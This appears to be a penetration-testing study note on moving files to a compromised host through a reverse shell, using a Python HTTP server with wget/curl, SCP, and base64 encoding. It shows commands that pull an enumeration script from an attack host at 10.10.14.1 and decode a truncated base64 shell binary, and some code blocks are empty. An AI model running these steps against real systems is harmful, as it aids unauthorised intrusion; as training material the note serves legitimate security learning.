- During any penetration testing exercise, it is likely that we will need  to transfer files to the remote server, such as enumeration scripts or exploits, or transfer data back to our attack host. While tools like Metasploit with a Meterpreter shell allow us to use the `Upload` command to upload a file, we need to learn methods to transfer files with a standard reverse shell.
- ## Using [[wget]]
	- There are many methods to accomplish this. One method is running a [Python HTTP server](https://developer.mozilla.org/en-US/docs/Learn/Common_questions/set_up_a_local_testing_server) on our machine and then using `wget` or `cURL` to download the file on the remote host. First, we go into the directory that contains the file we need to transfer and run a Python HTTP server in it:
	- ```bash
	  cd /tmp
	  ```
	- ```bash
	  python3 -m http.server 8000
	  ```
	- Now that we have set up a listening server on our machine, we can download the file on the remote host that we have code execution on:
	- ```bash
	  wget http://10.10.14.1:8000/linenum.sh
	  ```
	- Note that we used our IP `10.10.14.1` and the port our Python server runs on `8000`. If the remote server does not have `wget`, we can use `cURL` to download the file:
	- ```bash
	  curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
	  ```
	- Note that we used the `-o` flag to specify the output file name.
- ## Using [[SCP]]
	- Another method to transfer files would be using `scp`, granted we have obtained ssh user credentials on the remote host. We can do so as follows:
	- ```bash
	  ```
- ## Using [[Base64]]
	- In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to [base64](https://linux.die.net/man/1/base64) encode the file into `base64` format, and then we can paste the `base64` string on the remote server and decode it. For example, if we wanted to transfer a binary file called `shell`, we can `base64` encode it as follows:
	- ```bash
	  ```
	- Now, we can copy this `base64` string, go to the remote host, and use `base64 -d` to decode it, and pipe the output into a file:
	- ```bash
	  echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
	  ```
- ## Validating File Transfers
	- To validate the format of a file, we can run the [file](https://linux.die.net/man/1/file) command on it:
	- ```bash
	  file shell
	  ```
	- ```output
	  shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
	  ```
	- As we can see, when we run the `file` command on the `shell` file, it says that it is an ELF binary, meaning that we successfully transferred it. To ensure that we did not mess up the file during the encoding/decoding process, we can check its md5 hash. On our machine, we can run `md5sum` on it:
	- ```bash
	  md5sum shell
	  ```
	- We can verify the integrity by comparing the hash on both the client and host.
